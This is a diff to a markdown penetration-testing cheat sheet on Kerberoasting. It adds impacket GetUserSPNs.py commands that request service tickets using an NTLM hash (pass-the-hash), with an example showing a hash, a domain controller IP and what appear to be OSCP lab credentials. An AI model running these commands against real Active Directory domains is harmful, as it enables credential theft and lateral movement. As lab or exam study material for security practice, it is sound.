@@ -7,6 +7,14 @@ This attack targets [Service Principal Names (SPN)](https://docs.microsoft.com/
 ```bash
 impacket-GetUserSPNs -request -dc-ip <DomainController_IP>  -outputfile <output_file> <Domain/User>
 ```
+Using a Hash from a user 
+```
+GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
+```
+Example
+```
+GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'aad3b435b51404eeaad3b435b51404ee:e728ecbadfb02f51ce8eed753f3ff3fd' -dc-ip 10.10.94.140 'oscp.exam/celia.almeda'
+```
 - **-request** to obtain the TGS
 Example:
 ``` shell
